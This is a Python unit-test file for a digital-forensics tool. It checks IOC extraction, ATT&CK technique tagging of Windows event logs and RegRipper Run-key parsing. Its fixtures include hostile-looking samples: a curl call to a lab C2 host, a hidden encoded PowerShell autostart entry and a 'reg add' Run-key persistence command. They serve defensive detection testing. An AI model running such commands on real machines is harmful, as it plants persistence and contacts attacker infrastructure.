"""Detection fixes from the lab runs: IOC extraction (E30), event-log technique
tagging (E29), RegRipper Run-key parsing (E28) and registry JSON that stays valid."""

import json
import sys
import unittest
from pathlib import Path

sys.path.append(str(Path(__file__).resolve().parents[2] / "src" / "analysis"))

from dernvale.analysis.iocs import extract_line_iocs  # noqa: E402
from dernvale.process.extractions.artemis import eventlog_techniques  # noqa: E402
from dernvale.process.extractions.registry.profile import last_write_moved  # noqa: E402
from dernvale.process.extractions.registry.system import cleaned, run_key_records  # noqa: E402


class IocExtractionTest(unittest.TestCase):
    def test_every_ioc_on_a_line(self) -> None:
        line = "curl http://198.51.100.23/a -H 'Host: c2.rivendell-lab.test' && ping 8.8.8.8"
        self.assertEqual(
            extract_line_iocs(line),
            [("198.51.100.23", "IPv4 address"), ("c2.rivendell-lab.test", "domain"), ("8.8.8.8", "IPv4 address")],
        )

    def test_file_names_are_not_domains(self) -> None:
        for line in (
            "Invoke-WebRequest x -OutFile payload.ps1",
            "/Users/Shared/.x/update.sh",
            "chmod +x update.sh",
            "pnputil /add-driver netkvm.inf",
            "com.apple.bgtaskmanagementagent.plist",
        ):
            self.assertEqual(extract_line_iocs(line), [], line)

    def test_private_addresses_are_skipped(self) -> None:
        self.assertEqual(extract_line_iocs("10.1.2.3 172.16.0.9 192.168.64.4 127.0.0.1 169.254.0.1"), [])

    def test_internal_suffixes_and_mail(self) -> None:
        self.assertEqual(extract_line_iocs("dc01.contoso.local"), [("dc01.contoso.local", "domain")])
        self.assertEqual(extract_line_iocs("to: ops@mail.evil-corp.co.uk"), [("mail.evil-corp.co.uk", "domain")])

    def test_vendor_subdomains_versions_and_paths_are_noise(self) -> None:
        self.assertEqual(extract_line_iocs('<assembly manifestVersion="1.0.0.0" version="6.2.3.0">'), [])
        self.assertEqual(extract_line_iocs("http://schemas.microsoft.com/win/2004 swcdn.apple.com"), [])
        self.assertEqual(extract_line_iocs("prnms003.cat"), [])
        path = "https://cdn.example.org/" + "/".join(["content", "downloads", "61", "45", "072-44426-A_16242I3TPF"] * 4)
        self.assertEqual([kind for _, kind in extract_line_iocs(path) if "base64" in kind], [])


def _event(channel: str, event_id: int, **data) -> dict:
    return {"data": {"Event": {"System": {"Channel": channel, "EventID": event_id}, "EventData": data}}}


class EventlogTechniquesTest(unittest.TestCase):
    def test_service_install_and_brute_force(self) -> None:
        records = [_event("System", 7045, ImagePath="C:\\Windows\\System32\\cmd.exe /c exit 0")]
        records += [_event("Security", 4625) for _ in range(5)]
        self.assertEqual(
            eventlog_techniques(records),
            {"T1543.003", "T1569.002", "T1059.003", "T1110", "T1110.001"},
        )

    def test_ids_are_scoped_to_their_channel(self) -> None:
        self.assertEqual(eventlog_techniques([_event("Microsoft-Windows-Foo/Operational", 1102)]), set())
        self.assertEqual(eventlog_techniques([_event("Security", 1102)]), {"T1070.001"})

    def test_a_few_failed_logons_are_not_brute_force(self) -> None:
        self.assertEqual(eventlog_techniques([_event("Security", 4625)] * 4), set())

    def test_rdp_needs_logon_type_10(self) -> None:
        self.assertEqual(eventlog_techniques([_event("Security", 4624, LogonType="2")]), set())
        self.assertEqual(eventlog_techniques([_event("Security", 4624, LogonType="10")]), {"T1021.001"})


    def test_run_keys_and_the_startup_folder(self) -> None:
        sysmon = "Microsoft-Windows-Sysmon/Operational"
        hit = [
            _event(sysmon, 13, TargetObject="HKU\\S-1-5-21-1\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater"),
            _event(sysmon, 12, TargetObject="HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce"),
            _event("Security", 4657, ObjectName="\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run"),
            _event(sysmon, 1, CommandLine='reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v x /d c:\\x.exe'),
            _event(sysmon, 11, TargetFilename="C:\\Users\\pam\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\a.lnk"),
        ]
        for record in hit:
            self.assertIn("T1547.001", eventlog_techniques([record]), record)
        miss = [
            _event(sysmon, 13, TargetObject="HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunningApps\\x"),
            _event(sysmon, 13, TargetObject="HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced"),
            _event(sysmon, 1, CommandLine="notepad.exe C:\\Users\\pam\\Startup notes.txt"),
        ]
        for record in miss:
            self.assertNotIn("T1547.001", eventlog_techniques([record]), record)

class RunKeyRecordsTest(unittest.TestCase):
    # rip.pl output as Elrond sees it: str(bytes), so newlines are literal \n
    SECTION = (
        "run v.20200511\\n(Software, NTUSER.DAT) [Autostart] Get autostart key contents from Software hive"
        "\\n\\nMicrosoft\\\\Windows\\\\CurrentVersion\\\\Run\\nLastWrite Time 2026-10-25 20:56:20Z"
        "\\n  LabUpdater - powershell.exe -w hidden -enc VwBy\\n  SecurityHealth - %windir%\\\\system32\\\\x.exe"
        "\\n\\nMicrosoft\\\\Windows\\\\CurrentVersion\\\\Run has no subkeys."
        "\\n\\nMicrosoft\\\\Windows\\\\CurrentVersion\\\\RunOnce\\nLastWrite Time 2026-10-25 10:57:37Z"
        "\\nMicrosoft\\\\Windows\\\\CurrentVersion\\\\RunOnce has no values."
    )

    def test_one_record_per_value(self) -> None:
        records = [json.loads(r) for r in run_key_records(self.SECTION, "SOFTWARE")]
        self.assertEqual([r["AppName"] for r in records], ["LabUpdater", "SecurityHealth"])
        self.assertEqual(records[0]["AppLocation"], "powershell.exe -w hidden -enc VwBy")
        self.assertEqual(records[0]["LastWriteTime"], "2026-10-25 20:56:20Z")
        self.assertEqual(records[0]["Plugin"], "run")
        self.assertNotIn("AccountProfile", records[0])

    def test_profile_records_carry_the_account(self) -> None:
        records = [json.loads(r) for r in run_key_records(self.SECTION, "NTUSER.DAT", "gandalf")]
        self.assertEqual({r["AccountProfile"] for r in records}, {"gandalf"})

    def test_hives_with_quoted_values_are_valid_json(self) -> None:
        # Through Elrond's own path: rip.pl's output as str(bytes), the plugin handlers (which store
        # each record's JSON text JSON-encoded again) and the file write. Edge's Run value quotes its
        # path, which the old text clean-up turned into /" and left the whole hive unreadable.
        import os
        import tempfile
        from unittest import mock
        from dernvale.process.extractions.registry.profile import extract_registry_profile
        from dernvale.process.extractions.registry.system import extract_registry_system
        rip = ("Launching run v.20200511\n----------------------------------------\n"
               "run v.20200511\n(Software, NTUSER.DAT) [Autostart] Get autostart key contents from Software hive\n\n"
               "Microsoft\\Windows\\CurrentVersion\\Run\nLastWrite Time 2026-10-25 20:56:20Z\n"
               "  LabUpdater - powershell.exe -w hidden -enc VwBy\n"
               '  MicrosoftEdgeAutoLaunch - "C:\\Program Files\\msedge.exe"  --no-startup-window\n')
        with tempfile.TemporaryDirectory() as tmp:
            fake = Path(tmp) / "bin" / "rip.pl"
            fake.parent.mkdir()
            (Path(tmp) / "out.txt").write_text(rip)
            # Perl: the profile writer runs it with perl, the system one directly
            fake.write_text(f"#!/usr/bin/perl\nopen(my $f, '<', '{tmp}/out.txt'); print <$f>;\n")
            fake.chmod(0o755)
            out = tmp + "/"
            (Path(out) / "HOST" / "artefacts" / "cooked" / "registry").mkdir(parents=True)
            here = os.getcwd()
            os.chdir(fake.parent)  # the profile writer looks for rip.pl in a few fixed places, ./rip.pl among them
            self.addCleanup(os.chdir, here)
            with mock.patch.dict(os.environ, {"PATH": f"{fake.parent}:{os.environ['PATH']}"}):
                extract_registry_system(out, "HOST::Windows", "/", f"{tmp}/SOFTWARE", {}, [], [])
                extract_registry_profile(out, "HOST::Windows", "/", f"{tmp}/S-1-5-21-1000+NTUSER.DAT", {}, [], [],
                                         "S-1-5-21-1000", "NTUSER.DAT")
            for name in ("SOFTWARE.json", "S-1-5-21-1000+NTUSER.DAT.json"):
                records = json.loads((Path(out) / "HOST" / "artefacts" / "cooked" / "registry" / name).read_text())
                self.assertEqual([r["AppName"] for r in records], ["LabUpdater", "MicrosoftEdgeAutoLaunch"], name)
                self.assertEqual(records[1]["AppLocation"], '"C:/Program Files/msedge.exe" --no-startup-window')
                self.assertEqual(records[1]["RegistryKey"], "Microsoft/Windows/CurrentVersion/Run")

    def test_cleaned_values(self) -> None:
        self.assertEqual(cleaned({"a": "it\\'s  C:\\\\x ", "n": 3, "l": ["y\\\\z"]}),
                         {"a": "it's C:/x", "n": 3, "l": ["y/z"]})

    def test_last_write_time_gets_its_own_field(self) -> None:
        record = {"Plugin": "recentdocs", "Key": "LastWrite Time", "Value": "2026-10-25 20:56:20Z", "Name": "x"}
        self.assertEqual(last_write_moved(record), {"Plugin": "recentdocs", "Key": "-", "Value": "-", "Name": "x",
                                                    "LastWriteTime": "2026-10-25 20:56:20Z"})
        self.assertEqual(last_write_moved({"LastWrite Time": "a", "b": "c"}), {"LastWrite Time": "a", "b": "c"})


if __name__ == "__main__":
    unittest.main()
